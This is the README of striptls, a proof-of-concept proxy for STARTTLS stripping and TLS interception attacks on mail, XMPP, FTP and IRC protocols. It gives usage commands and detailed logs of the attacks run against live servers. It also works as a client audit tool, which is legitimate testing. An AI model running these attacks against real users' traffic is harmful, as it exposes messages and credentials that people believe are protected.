.. figure:: http://i68.tinypic.com/2iqz7t2.png

striptls - auditing proxy
=========================

poc implementation of STARTTLS stripping attacks
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

A generic tcp proxy implementation and audit tool to perform protocol
independent ``ssl/tls`` interception and ``STARTTLS`` stripping attacks
on ``SMTP``, ``POP3``, ``IMAP``, ``FTP``, ``NNTP``, ``XMPP``, ``ACAP``
and ``IRC``.

Requires:
         

-  Python >= 2.7.9 (``SSLContext``)
-  (optional for tls interception) Certificate and PrivateKey in PEM
   format (single file) ``--key=server.pem``

Vectors
^^^^^^^

-  GENERIC
-  Intercept - protocol independent ssl/tls interception. peeks for TLS
   Handshake, converts socket to tls (tls-to-tls proxy)
-  InboundIntercept - protocol independent ssl/tls interception for the
   inbound channel only (tls-to-plain proxy)
-  SMTP
-  SMTP.StripFromCapabilities - server response capability patch
-  SMTP.StripWithInvalidResponseCode - client STARTTLS stripping,
   invalid response code
-  SMTP.UntrustedIntercept - STARTTLS interception (client and server
   talking ssl) (requires server.pem in pwd)
-  SMTP.StripWithTemporaryError
-  SMTP.StripWithError
-  SMTP.ProtocolDowngradeStripExtendedMode
-  SMTP.InjectCommand
-  SMTP.InboundStarttlsProxy - (starttls-to-plain proxy)
-  POP3
-  POP3.StripFromCapabilities
-  POP3.StripWithError
-  POP3.UntrustedIntercept
-  IMAP
-  IMAP.StripFromCapabilities
-  IMAP.StripWithError
-  IMAP.UntrustedIntercept
-  IMAP.ProtocolDowngradeToV2
-  FTP
-  FTP.StripFromCapabilities
-  FTP.StripWithError
-  FTP.UntrustedIntercept
-  NNTP
-  NNTP.StripFromCapabilities
-  NNTP.StripWithError
-  NNTP.UntrustedIntercept
-  XMPP
-  XMPP.StripFromCapabilities
-  XMPP.StripInboundTLS
-  XMPP.UntrustedIntercept
-  ACAP (untested)
-  ACAP.StripFromCapabilities
-  ACAP.StripWithError
-  ACAP.UntrustedIntercept
-  IRC
-  IRC.StripFromCapabilities
-  IRC.StripWithError
-  IRC.UntrustedIntercept
-  IRC.StripWithNotRegistered
-  IRC.StripCAPWithNotregistered
-  IRC.StripWithSilentDrop

Results:

::

    - [*] client: 127.0.0.1
    -     [Vulnerable!] <class striptls.StripWithInvalidResponseCode at 0xffd3138c>
    -     [Vulnerable!] <class striptls.StripWithTemporaryError at 0xffd4611c>
    -     [           ] <class striptls.StripFromCapabilities at 0xffd316bc>
    -     [Vulnerable!] <class striptls.StripWithError at 0xffd4614c>
    - [*] client: 192.168.139.1
    -     [Vulnerable!] <class striptls.StripInboundTLS at 0x7f08319a6808>
    -     [Vulnerable!] <class striptls.StripFromCapabilities at 0x7f08319a67a0>
    -     [Vulnerable!] <class striptls.UntrustedIntercept at 0x7f08319a6870>

Usage
-----

::

    #> python -m striptls --help    # from pip/setup.py
    #> python striptls --help       # from source / root folder
    Usage: striptls.py [options]

           example: striptls.py --listen 0.0.0.0:25 --remote mail.server.tld:25


    Options:
      -h, --help            show this help message and exit
      -q, --quiet           be quiet [default: True]
      -l LISTEN, --listen=LISTEN
                            listen ip:port [default: 0.0.0.0:<remote_port>]
      -r REMOTE, --remote=REMOTE
                            remote target ip:port to forward sessions to
      -k KEY, --key=KEY     SSL Certificate and Private key file to use, PEM
                            format assumed [default: server.pem]
      -s, --generic-ssl-intercept
                            dynamically intercept SSL/TLS
      -b BUFFER_SIZE, --bufsiz=BUFFER_SIZE
      -x VECTORS, --vectors=VECTORS
                            Comma separated list of vectors. Use 'ALL' (default)
                            to select all vectors, 'NONE' for tcp/ssl proxy mode.
                            Available vectors: ACAP.StripFromCapabilities,
                            ACAP.StripWithError, ACAP.UntrustedIntercept,
                            FTP.StripFromCapabilities, FTP.StripWithError,
                            FTP.UntrustedIntercept, GENERIC.Intercept,
                            IMAP.ProtocolDowngradeToV2,
                            IMAP.StripFromCapabilities, IMAP.StripWithError,
                            IMAP.UntrustedIntercept,
                            IRC.StripCAPWithNotRegistered,
                            IRC.StripFromCapabilities, IRC.StripWithError,
                            IRC.StripWithNotRegistered, IRC.StripWithSilentDrop,
                            IRC.UntrustedIntercept, NNTP.StripFromCapabilities,
                            NNTP.StripWithError, NNTP.UntrustedIntercept,
                            POP3.StripFromCapabilities, POP3.StripWithError,
                            POP3.UntrustedIntercept, SMTP.InboundStarttlsProxy,
                            SMTP.InjectCommand,
                            SMTP.ProtocolDowngradeStripExtendedMode,
                            SMTP.StripFromCapabilities, SMTP.StripWithError,
                            SMTP.StripWithInvalidResponseCode,
                            SMTP.StripWithTemporaryError, SMTP.UntrustedIntercept,
                            XMPP.StripFromCapabilities, XMPP.StripInboundTLS,
                            XMPP.UntrustedIntercept [default: ALL]

Install (optional)
------------------

from pip

::

    #> pip install striptls

from source

::

    #> setup.py install

Examples
--------

::

                      inbound                    outbound
    [inbound_peer]<------------->[listen:proxy]<------------->[outbound_peer/target]
      smtp-client                   striptls                    remote/target

local ``smtp-client`` -> ``localhost:8825`` (proxy) ->
``mail.gmx.net:25``

Generic SSL/TLS Interception
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

``--generic-ssl-intercept`` is a global switch to enable generic ssl/tls
handshake detection and session conversion. Can be combined with any
mangle/vector.

``GENERIC.Intercept`` is a mangle/vector implementation of the ssl/tls
handshake detect and convert feature.

::

    # python striptls.py -l 0.0.0.0:9999 -r mail.gmx.com:465 -x GENERIC.Intercept
    - INFO     - <Proxy 0x1fdcf50 listen=('0.0.0.0', 9999) target=('mail.gmx.com', 465)> ready.
    - DEBUG    - * added vector (port:None , proto: GENERIC): <class __main__.Intercept at 0x0218AAB0>
    - INFO     - <RewriteDispatcher ssl/tls_intercept=False vectors={None: set([<class __main__.Intercept at 0x0218AAB0>])}>
    - INFO     - <Session 0x1ff00b0> client ('127.0.0.1', 8228) has connected
    - INFO     - <Session 0x1ff00b0> connecting to target ('mail.gmx.com', 465)
    - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.Intercept new: True>
    - INFO     - ProtocolDetect: SSL/TLS version: TLS_1_0
    - INFO     - SSL Handshake detected - performing ssl/tls conversion
    - DEBUG    - <Session 0x1ff00b0> [client] <> [      ]          SSL handshake done: ('ECDHE-RSA-AES256-GCM-SHA384', 'TLSv1/SSLv3', 256)
    - DEBUG    - <Session 0x1ff00b0> [      ] <> [server]          SSL handshake done: ('DHE-RSA-AES256-GCM-SHA384', 'TLSv1/SSLv3', 256)
    - DEBUG    - <Session 0x1ff00b0> [client] <= [server]          '220 gmx.com (mrgmx101) Nemesis ESMTP Service ready\r\n'
    - DEBUG    - <Session 0x1ff00b0> [client] => [server]          'hi\r\n'
    - DEBUG    - <Session 0x1ff00b0> [client] <= [server]          '500 Syntax error, command unrecognized\r\n'

    # python striptls.py -l 0.0.0.0:9999 -r mail.gmx.com:25 -x NONE --generic-ssl-intercept
    - INFO     - <Proxy 0x1efbf70 listen=('0.0.0.0', 9999) target=('mail.gmx.com', 25)> ready.
    - INFO     - <RewriteDispatcher ssl/tls_intercept=True vectors={}>
    - DEBUG    - <ProtocolDetect 0x1f21b70 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    - INFO     - <Session 0x1f10110> client ('127.0.0.1', 8290) has connected
    - INFO     - <Session 0x1f10110> connecting to target ('mail.gmx.com', 25)
    - DEBUG    - <Session 0x1f10110> [client] <= [server]          '220 gmx.com (mrgmx101) Nemesis ESMTP Service ready\r\n'
    - DEBUG    - <Session 0x1f10110> [client] => [server]          'EHLO openssl.client.net\r\n'
    - DEBUG    - <Session 0x1f10110> [client] <= [server]          '250-gmx.com Hello openssl.client.net [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    - DEBUG    - <Session 0x1f10110> [client] => [server]          'STARTTLS\r\n'
    - DEBUG    - <Session 0x1f10110> [client] <= [server]          '220 OK\r\n'
    - INFO     - ProtocolDetect: SSL/TLS version: TLS_1_0
    - INFO     - SSL Handshake detected - performing ssl/tls conversion
    - DEBUG    - <Session 0x1f10110> [client] <> [      ]          SSL handshake done: ('ECDHE-RSA-AES256-GCM-SHA384', 'TLSv1/SSLv3', 256)
    - DEBUG    - <Session 0x1f10110> [      ] <> [server]          SSL handshake done: ('DHE-RSA-AES256-GCM-SHA384', 'TLSv1/SSLv3', 256)
    - DEBUG    - <Session 0x1f10110> [client] => [server]          'EHLO A\r\n'
    - DEBUG    - <Session 0x1f10110> [client] <= [server]          '250-gmx.com Hello A [xxx.xxx.xxx.xxx]\r\n250-SIZE 69920427\r\n250AUTH LOGIN PLAIN\r\n'

Audit Mode
~~~~~~~~~~

iterates all protocol specific cases on a per client basis and keeps
track of clients violating the starttls protocol. Ctrl+C to abort audit
and print results.

::

    #> python striptls --listen localhost:8825 --remote=mail.gmx.net:25
    - INFO     - <Proxy 0xffcf6d0cL listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
    - DEBUG    - * added test (port:21   , proto:     FTP): <class striptls.StripFromCapabilities at 0xffd4632c>
    - DEBUG    - * added test (port:21   , proto:     FTP): <class striptls.StripWithError at 0xffd4635c>
    - DEBUG    - * added test (port:21   , proto:     FTP): <class striptls.UntrustedIntercept at 0xffd4638c>
    - DEBUG    - * added test (port:143  , proto:    IMAP): <class striptls.StripFromCapabilities at 0xffd4626c>
    - DEBUG    - * added test (port:143  , proto:    IMAP): <class striptls.StripWithError at 0xffd4629c>
    - DEBUG    - * added test (port:143  , proto:    IMAP): <class striptls.UntrustedIntercept at 0xffd462cc>
    - DEBUG    - * added test (port:119  , proto:    NNTP): <class striptls.StripFromCapabilities at 0xffd463ec>
    - DEBUG    - * added test (port:119  , proto:    NNTP): <class striptls.StripWithError at 0xffd4641c>
    - DEBUG    - * added test (port:119  , proto:    NNTP): <class striptls.UntrustedIntercept at 0xffd4644c>
    - DEBUG    - * added test (port:110  , proto:    POP3): <class striptls.StripWithError at 0xffd461dc>
    - DEBUG    - * added test (port:110  , proto:    POP3): <class striptls.UntrustedIntercept at 0xffd4620c>
    - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripFromCapabilities at 0xffd316bc>
    - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripWithError at 0xffd4614c>
    - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripWithInvalidResponseCode at 0xffd3138c>
    - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripWithTemporaryError at 0xffd4611c>
    - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.UntrustedIntercept at 0xffd4617c>
    - DEBUG    - * added test (port:5222 , proto:    XMPP): <class striptls.StripFromCapabilities at 0xffd464ac>
    - INFO     - <RewriteDispatcher vectors={5222: set([<class striptls.StripFromCapabilities at 0xffd464ac>]), 110: set([<class striptls.UntrustedIntercept at 0xffd4620c>, <class striptls.StripWithError at 0xffd461dc>]), 143: set([<class striptls.StripWithError at 0xffd4629c>, <class striptls.UntrustedIntercept at 0xffd462cc>, <class striptls.StripFromCapabilities at 0xffd4626c>]), 21: set([<class striptls.UntrustedIntercept at 0xffd4638c>, <class striptls.StripFromCapabilities at 0xffd4632c>, <class striptls.StripWithError at 0xffd4635c>]), 119: set([<class striptls.StripWithError at 0xffd4641c>, <class striptls.UntrustedIntercept at 0xffd4644c>, <class striptls.StripFromCapabilities at 0xffd463ec>]), 25: set([<class striptls.StripWithInvalidResponseCode at 0xffd3138c>, <class striptls.StripWithTemporaryError at 0xffd4611c>, <class striptls.StripFromCapabilities at 0xffd316bc>, <class striptls.StripWithError at 0xffd4614c>, <class striptls.UntrustedIntercept at 0xffd4617c>])}>
    - DEBUG    - <ProtocolDetect 0xffcf6eccL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    - INFO     - <Session 0xffcf6e4cL> client ('127.0.0.1', 28902) has connected
    - INFO     - <Session 0xffcf6e4cL> connecting to target ('mail.gmx.net', 25)
    - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '220 gmx.com (mrgmx001) Nemesis ESMTP Service ready\r\n'
    - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripWithInvalidResponseCode new: True>
    - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250-STARTTLS\r\n250 STARTTLS\r\n'
    - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'STARTTLS\r\n'
    - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server][mangled] '200 STRIPTLS\r\n'
    - DEBUG    - <Session 0xffcf6e4cL> [client] => [server][mangled] None
    - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '530 Authentication required\r\n'
    - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'rset\r\n'
    - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '250 OK\r\n'
    - WARNING  - <Session 0xffcf6e4cL> terminated.
    - DEBUG    - <ProtocolDetect 0xffd0920cL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    - INFO     - <Session 0xffd0918cL> client ('127.0.0.1', 28905) has connected
    - INFO     - <Session 0xffd0918cL> connecting to target ('mail.gmx.net', 25)
    - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
    - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripWithTemporaryError new: True>
    - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'STARTTLS\r\n'
    - DEBUG    - <Session 0xffd0918cL> [client] <= [server][mangled] '454 TLS not available due to temporary reason\r\n'
    - DEBUG    - <Session 0xffd0918cL> [client] => [server][mangled] None
    - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '530 Authentication required\r\n'
    - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'rset\r\n'
    - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '250 OK\r\n'
    - WARNING  - <Session 0xffd0918cL> terminated.
    - DEBUG    - <ProtocolDetect 0xffd092ecL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    - INFO     - <Session 0xffd0926cL> client ('127.0.0.1', 28908) has connected
    - INFO     - <Session 0xffd0926cL> connecting to target ('mail.gmx.net', 25)
    - DEBUG    - <Session 0xffd0926cL> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
    - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripFromCapabilities new: True>
    - DEBUG    - <Session 0xffd0926cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    - DEBUG    - <Session 0xffd0926cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    - DEBUG    - <Session 0xffd0926cL> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250 AUTH LOGIN PLAIN\r\n'
    - WARNING  - <Session 0xffd0926cL> terminated.
    - DEBUG    - <ProtocolDetect 0xffd093ccL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    - INFO     - <Session 0xffd0934cL> client ('127.0.0.1', 28911) has connected
    - INFO     - <Session 0xffd0934cL> connecting to target ('mail.gmx.net', 25)
    - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '220 gmx.com (mrgmx002) Nemesis ESMTP Service ready\r\n'
    - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripWithError new: True>
    - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'STARTTLS\r\n'
    - DEBUG    - <Session 0xffd0934cL> [client] <= [server][mangled] '501 Syntax error\r\n'
    - DEBUG    - <Session 0xffd0934cL> [client] => [server][mangled] None
    - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '530 Authentication required\r\n'
    - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'rset\r\n'
    - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '250 OK\r\n'
    - WARNING  - <Session 0xffd0934cL> terminated.
    - WARNING  - Ctrl C - Stopping server
    - INFO     -  -- audit results --
    - INFO     - [*] client: 127.0.0.1
    - INFO     -     [Vulnerable!] <class striptls.StripWithInvalidResponseCode at 0xffd3138c>
    - INFO     -     [Vulnerable!] <class striptls.StripWithTemporaryError at 0xffd4611c>
    - INFO     -     [           ] <class striptls.StripFromCapabilities at 0xffd316bc>
    - INFO     -     [Vulnerable!] <class striptls.StripWithError at 0xffd4614c>

Strip STARTTLS from server capabilities
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    #> python striptls --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.StripFromCapabilities
    - INFO     - <Proxy 0x1fe6e70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
    - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripFromCapabilities at 0x01FE77D8>])}>
    - DEBUG    - <ProtocolDetect 0x1fe6f90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
    - INFO     - <Session 0x1fe6f10> client ('127.0.0.1', 20070) has connected
    - INFO     - <Session 0x1fe6f10> connecting to target ('mail.gmx.net', 25)
    - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
    - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    - DEBUG    - <Session 0x1fe6f10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250 AUTH LOGIN PLAIN\r\n'
    - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '530 Authentication required\r\n'
    - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'rset\r\n'
    - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '250 OK\r\n'
    - WARNING  - <Session 0x1fe6f10> terminated.

Invalid STARTTLS response code
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    #> python striptls --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.StripWithInvalidResponseCode
    - INFO     - <Proxy 0x1fefe70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
    - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripWithInvalidResponseCode at 0x02010730>])}>
    - DEBUG    - <ProtocolDetect 0x1feff90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
    - INFO     - <Session 0x1feff10> client ('127.0.0.1', 20061) has connected
    - INFO     - <Session 0x1feff10> connecting to target ('mail.gmx.net', 25)
    - DEBUG    - <Session 0x1feff10> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
    - DEBUG    - <Session 0x1feff10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    - DEBUG    - <Session 0x1feff10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    - DEBUG    - <Session 0x1feff10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250-STARTTLS\r\n250 STARTTLS\r\n'
    - DEBUG    - <Session 0x1feff10> [client] => [server]          'STARTTLS\r\n'
    - DEBUG    - <Session 0x1feff10> [client] <= [server][mangled] '200 STRIPTLS\r\n'
    - DEBUG    - <Session 0x1feff10> [client] => [server][mangled] None
    - DEBUG    - <Session 0x1feff10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    - DEBUG    - <Session 0x1feff10> [client] <= [server]          '530 Authentication required\r\n'
    - DEBUG    - <Session 0x1feff10> [client] => [server]          'rset\r\n'
    - DEBUG    - <Session 0x1feff10> [client] <= [server]          '250 OK\r\n'
    - WARNING  - <Session 0x1feff10> terminated.

Untrusted SSL Intercept (for clients not checking server cert trust)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    #> python striptls --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.UntrustedIntercept
    - INFO     - <Proxy 0x1f468f0 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
    - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.UntrustedIntercept at 0x01F45298>])}>
    - DEBUG    - <ProtocolDetect 0x1f46a10 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    - INFO     - <Session 0x1f46990> client ('127.0.0.1', 20238) has connected
    - INFO     - <Session 0x1f46990> connecting to target ('mail.gmx.net', 25)
    - DEBUG    - <Session 0x1f46990> [client] <= [server]          '220 gmx.com (mrgmx002) Nemesis ESMTP Service ready\r\n'
    - DEBUG    - <Session 0x1f46990> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    - DEBUG    - <Session 0x1f46990> [client] => [server]          'STARTTLS\r\n'
    - DEBUG    - <Session 0x1f46990> [client] <= [server][mangled] '220 Go ahead\r\n'
    - DEBUG    - <Session 0x1f46990> [client] <= [server][mangled] waiting for inbound SSL Handshake
    - DEBUG    - <Session 0x1f46990> [client] => [server]          'STARTTLS\r\n'
    - DEBUG    - <Session 0x1f46990> [client] => [server][mangled] performing outbound SSL handshake
    - DEBUG    - <Session 0x1f46990> [client] => [server][mangled] None
    - DEBUG    - <Session 0x1f46990> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [xxx.xxx.xxx.xxx]\r\n250-SIZE 69920427\r\n250 AUTH LOGIN PLAIN\r\n'
    - DEBUG    - <Session 0x1f46990> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    - DEBUG    - <Session 0x1f46990> [client] <= [server]          '530 Authentication required\r\n'
    - DEBUG    - <Session 0x1f46990> [client] => [server]          'rset\r\n'
    - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250 OK\r\n'
    - WARNING  - <Session 0x1f46990> terminated.

XMPP Audit Trail
~~~~~~~~~~~~~~~~

Example: Pidgin with optional transport security.

XMPP.StripInboundTLS - Inbound Plain - Outbound TLS - in case server requires starttls
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

        python striptls --listen 0.0.0.0:5222 --remote jabber.ccc.de:5222 -k ../server.pem
        - INFO     - <Proxy 0x7f08322ba310 listen=('0.0.0.0', 5222) target=('jabber.ccc.de', 5222)> ready.
        ...
        - DEBUG    - <ProtocolDetect 0x7f083196a810 protocol_id=PROTO_XMPP len_history=0> - protocol detected (target port)
        ...
        - INFO     - <Session 0x7f083196a7d0> client ('192.168.139.1', 56888) has connected
        - INFO     - <Session 0x7f083196a7d0> connecting to target ('jabber.ccc.de', 5222)
        - DEBUG    - <Session 0x7f083196a7d0> [client] => [server]          "<?xml version='1.0' ?><stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
        - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripInboundTLS new: True>
        - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='13821701589972978594' from='jabber.ccc.de' version='1.0' xml:lang='en'>"
        - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls></stream:features>"
        - DEBUG    - <Session 0x7f083196a7d0> [client] => [server][mangled] "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
        - DEBUG    - <Session 0x7f083196a7d0> [client] => [server][mangled] performing outbound SSL handshake
        - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server][mangled] "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/></stream:features>"
        - DEBUG    - <Session 0x7f083196a7d0> [client] => [server]          "<iq type='get' id='purple9f914f80'><query xmlns='jabber:iq:auth'><username>tin</username></query></iq>"
        - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='13515446948282835507' from='jabber.ccc.de' xml:lang='en'>"
        - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<stream:error><invalid-namespace xmlns='urn:ietf:params:xml:ns:xmpp-streams'></invalid-namespace></stream:error>"
        - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          '</stream:stream>'
        - WARNING  - <Session 0x7f083196a7d0> terminated.

XMPP.StripFromCapabilities - strip starttls server annoucement
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

        - DEBUG    - <ProtocolDetect 0x7f083196a990 protocol_id=PROTO_XMPP len_history=0> - protocol detected (target port)
        - INFO     - <Session 0x7f083196a910> client ('192.168.139.1', 56890) has connected
        - INFO     - <Session 0x7f083196a910> connecting to target ('jabber.ccc.de', 5222)
        - DEBUG    - <Session 0x7f083196a910> [client] => [server]          "<?xml version='1.0' ?><stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
        - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripFromCapabilities new: True>
        - DEBUG    - <Session 0x7f083196a910> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='12381525525258986322' from='jabber.ccc.de' version='1.0' xml:lang='en'>"
        - DEBUG    - <Session 0x7f083196a910> [client] <= [server]          "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls></stream:features>"
        - DEBUG    - <Session 0x7f083196a910> [client] <= [server][mangled] "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/></stream:features>"
        - DEBUG    - <Session 0x7f083196a910> [client] => [server]          "<iq type='get' id='purplecfe2ee07'><query xmlns='jabber:iq:auth'><username>tin</username></query></iq>"
        - DEBUG    - <Session 0x7f083196a910> [client] <= [server]          "<stream:error><policy-violation xmlns='urn:ietf:params:xml:ns:xmpp-streams'></policy-violation><text xml:lang='' xmlns='urn:ietf:params:xml:ns:xmpp-streams'>Use of STARTTLS required</text></stream:error></stream:stream>"
        - WARNING  - <Session 0x7f083196a910> terminated.

XMPP.StripUntrustedIntercept - TLS Interception inbound and outbound with own certificate/key
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

        - DEBUG    - <ProtocolDetect 0x7f083196aa90 protocol_id=PROTO_XMPP len_history=0> - protocol detected (target port)
